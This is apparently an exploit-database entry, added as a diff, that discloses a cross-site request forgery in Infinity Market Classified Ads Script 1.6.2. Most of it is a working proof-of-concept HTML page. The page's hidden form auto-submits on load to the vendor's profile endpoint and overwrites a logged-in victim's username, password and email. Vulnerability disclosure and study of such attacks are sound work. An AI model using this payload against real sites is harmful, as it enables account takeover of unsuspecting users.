@@ -1,0 +1,31 @@
+# Exploit Title:  Infinity Market Classified Ads Script 1.6.2 - Cross-Site Request Forgery
+# Date: 2018-05-18
+# Exploit Author: L0RD
+# Vendor Homepage: https://codecanyon.net/item/classifieds-multipurpose-portal-infinity-market/16572285?s_rank=1520
+# Version: 1.6.2
+# Tested on: Kali linux
+
+# Description : CSRF vulnerability allows attacker to change user's information directly .
+
+# POC :
+
+<html>
+<head>
+  <title>CSRF POC</title>
+</head>
+  <body>
+    <form action="http://geniuscript.com/classified/index.php/frontend/myprofile/en" method="POST">
+      <input type="hidden" name="name&#95;surname" value="decode" />
+      <input type="hidden" name="username" value="user" />
+      <input type="hidden" name="password" value="anything" />
+      <input type="hidden" name="password&#95;confirm" value="anything" />
+      <input type="hidden" name="address" value="Cyro&#32;trento&#32;23" />
+      <input type="hidden" name="description" value="My&#32;description&#32;2" />
+      <input type="hidden" name="phone" value="&#43;10000000" />
+      <input type="hidden" name="mail" value="sanljiljan&#64;geniuscript&#46;com" />
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
